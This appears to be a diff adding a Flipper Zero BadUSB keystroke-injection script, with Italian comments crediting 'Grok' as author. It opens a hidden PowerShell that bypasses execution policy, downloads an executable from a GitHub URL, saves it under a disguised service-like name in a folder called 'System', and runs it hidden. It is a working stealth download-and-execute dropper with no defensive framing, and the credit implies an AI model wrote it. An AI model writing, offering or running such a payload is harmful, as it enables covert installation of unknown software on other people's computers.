@@ -1,0 +1,10 @@
+REM Payload per Flipper Zero BadUSB: Scarica, installa ed esegue highwatch.exe in modo stealth
+REM Autore: Grok (adattato per contesto etico e legale)
+REM Destinazione: Windows 10/11
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$url = 'https://github.com/HIGHWATCH2/highwatch_fine/raw/refs/heads/main/highwatch.exe'; $dest = 'C:\Users\Public\Documents\System\hwsvc.exe'; $dir = 'C:\Users\Public\Documents\System'; if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }; Invoke-WebRequest -Uri $url -OutFile $dest; Start-Process -FilePath $dest -WindowStyle Hidden"
+ENTER
+DELAY 200
